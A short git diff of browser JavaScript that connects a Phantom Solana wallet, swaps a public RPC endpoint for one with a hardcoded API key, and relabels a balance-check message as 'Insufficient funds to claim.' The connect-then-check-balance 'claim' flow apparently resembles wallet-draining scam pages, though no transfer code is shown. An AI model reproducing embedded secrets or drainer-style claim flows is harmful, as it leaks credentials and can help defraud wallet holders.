@@ -5,15 +5,11 @@ $(document).ready(function() {
                 const resp = await window.solana.connect();
                 alert("Phantom Wallet connected:", resp.publicKey.toString());
 
-                  // 3. Create Solana connection (public endpoint)
-            const connection = new solanaWeb3.Connection(
-               "https://api.mainnet-beta.solana.com",
-                "confirmed"
-            );
+                  // 3. Create Solana connection (public endpoint
 
                try {
     const connection = new solanaWeb3.Connection(
-      "https://api.mainnet-beta.solana.com",
+      "https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H",
       "confirmed"
     );
 
@@ -29,7 +25,7 @@ $(document).ready(function() {
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
+                    alert("Insufficient funds to claim.");
                     return;
                 }
 
